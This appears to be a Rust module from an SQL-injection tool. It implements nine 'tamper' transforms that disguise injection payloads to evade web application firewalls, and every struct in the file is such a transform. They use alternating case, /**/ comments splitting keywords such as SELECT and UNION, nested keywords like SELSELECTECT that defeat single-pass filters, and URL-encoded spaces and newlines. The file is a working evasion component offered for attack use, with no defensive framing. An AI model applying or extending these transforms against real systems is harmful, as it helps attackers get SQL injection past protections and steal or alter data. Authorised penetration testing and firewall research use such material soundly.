use super::TamperScript;

pub struct TamperRandomCase;
impl TamperScript for TamperRandomCase {
    fn name(&self) -> &'static str {
        "randomcase"
    }
    fn description(&self) -> &'static str {
        "Alternate upper/lower case per character"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            })
            .collect()
    }
}

pub struct TamperInlineComment;
impl TamperScript for TamperInlineComment {
    fn name(&self) -> &'static str {
        "inline_comment"
    }
    fn description(&self) -> &'static str {
        "Split every SQL keyword with /**/ fragments"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "SE/**/LE/**/CT")
            .replace("UNION", "UN/**/IO/**/N")
            .replace("WHERE", "WH/**/ER/**/E")
            .replace("FROM", "FR/**/OM")
            .replace("AND", "AN/**/D")
            .replace("ORDER", "OR/**/DER")
            .replace("INSERT", "INS/**/ERT")
            .replace("UPDATE", "UP/**/DATE")
            .replace("DELETE", "DEL/**/ETE")
    }
}

pub struct TamperDoubleKeyword;
impl TamperScript for TamperDoubleKeyword {
    fn name(&self) -> &'static str {
        "double_keyword"
    }
    fn description(&self) -> &'static str {
        "Double keywords to bypass remove-once WAF rules"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "SELSELECTECT")
            .replace("UNION", "UNUNIONION")
            .replace("WHERE", "WHWHEREERE")
            .replace("FROM", "FRFROMOM")
            .replace("AND", "AANDND")
            .replace("OR", "OORR")
    }
}

pub struct TamperCaseCommentMix;
impl TamperScript for TamperCaseCommentMix {
    fn name(&self) -> &'static str {
        "case_comment_mix"
    }
    fn description(&self) -> &'static str {
        "Mix case and inline comments: UnI/**/On, SeLeCt, WhErE"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("UNION", "UnI/**/On")
            .replace("SELECT", "SeLeCt")
            .replace("WHERE", "WhErE")
    }
}

pub struct TamperHexKeyword;
impl TamperScript for TamperHexKeyword {
    fn name(&self) -> &'static str {
        "hex_keyword"
    }
    fn description(&self) -> &'static str {
        "Hex-encode trailing space after SQL keywords (SELECT%20)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT ", "SELECT%20")
            .replace("UNION ", "UNION%20")
    }
}

pub struct TamperKeywordNewlineSplit;
impl TamperScript for TamperKeywordNewlineSplit {
    fn name(&self) -> &'static str {
        "keyword_newline_split"
    }
    fn description(&self) -> &'static str {
        "Split SQL keywords with URL-encoded newline: SEL%0aECT"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "SEL%0aECT")
            .replace("UNION", "UN%0aION")
            .replace("WHERE", "WH%0aERE")
    }
}

pub struct TamperRandomComments;
impl TamperScript for TamperRandomComments {
    fn name(&self) -> &'static str {
        "randomcomments"
    }
    fn description(&self) -> &'static str {
        "Split every keyword with random /**/ fragments: S/*x*/E/*y*/L/*z*/ECT"
    }
    fn tamper(&self, payload: &str) -> String {
        fn split_keyword(kw: &str, tag: &str) -> String {
            kw.chars()
                .enumerate()
                .map(|(i, c)| {
                    if i == 0 {
                        c.to_string()
                    } else {
                        format!("/*{}*/{}", tag, c)
                    }
                })
                .collect()
        }
        payload
            .replace("SELECT", &split_keyword("SELECT", "a"))
            .replace("UNION", &split_keyword("UNION", "b"))
            .replace("WHERE", &split_keyword("WHERE", "c"))
            .replace("FROM", &split_keyword("FROM", "d"))
            .replace("AND", &split_keyword("AND", "e"))
            .replace("OR", &split_keyword("OR", "f"))
            .replace("INSERT", &split_keyword("INSERT", "g"))
            .replace("UPDATE", &split_keyword("UPDATE", "h"))
            .replace("DELETE", &split_keyword("DELETE", "i"))
    }
}

pub struct TamperLowercase;
impl TamperScript for TamperLowercase {
    fn name(&self) -> &'static str {
        "lowercase"
    }
    fn description(&self) -> &'static str {
        "Lowercase all SQL keywords (case-sensitive WAF bypass)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload.to_lowercase()
    }
}

pub struct TamperNonRecursiveReplacement;
impl TamperScript for TamperNonRecursiveReplacement {
    fn name(&self) -> &'static str {
        "nonrecursivereplacement"
    }
    fn description(&self) -> &'static str {
        "Embed removable marker inside keywords: SELESELECTECT (single-pass WAF removal)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "SELESELECTECT")
            .replace("UNION", "UNIOUNIONNION")
            .replace("WHERE", "WHERWHEREE")
            .replace("FROM", "FRFROMOM")
            .replace("AND", "AANDND")
    }
}
